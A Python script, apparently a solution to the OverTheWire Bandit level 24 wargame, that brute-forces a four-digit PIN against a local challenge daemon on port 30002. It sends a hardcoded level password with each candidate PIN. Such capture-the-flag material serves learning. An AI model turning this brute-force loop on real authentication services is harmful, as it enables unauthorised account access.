#!/bin/python3

#Script to win overthewire bandit 24 challenge

import threading
import socket
from time import sleep

HOST = "127.0.0.1"
PORT = 30002
BUFFERSIZE = 2048
PASS = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

#Types 0 - Normal, 1 - Warning, 2 - Success
def outputMessage(msg, type):
    if (type == 1):
        print("[!] " + msg)
    elif (type == 2):
        print("[*] " + msg)
    else:
        print("[+] " + msg)

#Brute Force Thread >:3
def bruteForce(startIndex, id):
    global HOST, PORT, BUFFERSIZE, PASS
    
    outputMessage("THREAD " + str(id) + " ACTIVE", 0)
    threadSocket = socket.socket()
    threadSocket.connect((HOST, PORT))

    #Allow for inital message fluff
    threadSocket.recv(BUFFERSIZE)

    for i in range(1000):
        PIN = startIndex + i
        #outputMessage(str(id) + ":" + str(PIN) , 0)
        threadSocket.send((PASS + " " + str(PIN) + "\n").encode())
        response = threadSocket.recv(BUFFERSIZE).decode()
        if ("Try again." in response):
            if ((i % 100) == 0):
                outputMessage("Progress: " + str(i), 0)
        else:
            outputMessage("PIN FOUND :)", 2)
            outputMessage(str(PIN), 2)
            outputMessage(response, 2)
            exit(0)

    outputMessage("THREAD " + str(id) + " END", 0)
    
############
### MAIN ###
############

outputMessage("Starting Bruteforce Software...", 0)

#Spawn Threads
outputMessage("Spawning Threads...", 0)
for i in range(10):
    thread = threading.Thread(target=bruteForce, args=((i * 1000), i,))
    thread.start()
    thread.join() #Cry - Bandit doesn't allow multiple threads
    
outputMessage("Happy Hunting :)", 0)
